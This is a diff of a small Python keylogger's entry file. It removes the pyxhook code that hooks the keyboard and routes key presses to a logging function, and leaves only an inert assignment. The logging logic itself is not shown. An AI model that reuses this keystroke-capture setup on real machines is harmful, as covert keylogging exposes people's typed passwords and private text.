@@ -1,25 +1,12 @@
 
 # import libs
 import pyxhook
-import subprocess
-import time
-import textwrap
-import logLogic
+from logLogic import OnKeyPress
 
 
 def main():
-
-    new_hook = pyxhook.HookManager()
-
-    # Inhert Keylogging logic from pyxhook
-    # & logLogic implemnts the OnKeyPress function
-    new_hook.KeyDown = logLogic.OnKeyPress
-
-    # Hook the keyboard
-    new_hook.HookKeyboard()
-
-    # start the session
-    new_hook.start()
+    
+    execute = OnKeyPress
 
 
 if __name__ == "__main__":
